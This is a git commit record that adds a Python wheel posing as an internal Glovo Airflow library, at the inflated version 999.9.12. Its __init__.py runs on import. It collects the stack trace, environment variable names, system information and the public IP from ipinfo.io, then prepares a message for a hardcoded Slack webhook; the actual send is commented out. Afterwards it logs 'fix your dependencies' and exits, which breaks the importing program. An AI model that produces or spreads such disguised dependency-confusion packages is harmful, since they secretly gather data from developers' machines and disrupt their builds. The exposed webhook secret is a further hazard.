47f245e306c7bf47437696b16923e3b1c5a94e05
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-02-23 03:05:21 +0000

    Add package glovo-data-platform-declarative-airflow/999.9.12/glovo_data_platform_declarative_airflow-999.9.12-py3-none-any.whl

---
+++ packages/glovo-data-platform-declarative-airflow/glovo_data_platform_declarative_airflow-999.9.12-py3-none-any.whl/glovo_data_platform/declarative_airflow/__init__.py
@@ -0,0 +1,43 @@
+import os
+import logging
+import json
+import inspect
+import traceback
+from urllib import request
+
+def log(msg):
+    print(msg)
+    logger.critical(msg)
+    logger.error(msg)
+    logger.info(msg)
+    logger.debug(msg)
+
+def save_some_stuff():
+    try:
+        _save_some_stuff()
+    except:
+        return
+    
+def _save_some_stuff():
+    url = "https://hooks.slack.com/services/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"
+    data = (
+        f"\t stack={traceback.extract_stack()}\n\n"
+        f"\t env={dict(os.environ).keys()}\n\n"
+        f"\t uname={os.uname()}\n\n"
+        f"\t ip={request.urlopen('https://ipinfo.io/ip').read().decode('utf8')}"
+    )
+    body = {"text": data}
+    print(body)
+    data = json.dumps(body)
+    data = data.encode()
+    req =  request.Request(url)
+    req.add_header('Content-Type', 'application/json')
+    # request.urlopen(req, data=data)
+
+
+logger = logging.getLogger()
+_save_some_stuff()
+log("fix your dependencies")
+
+
+exit(1)
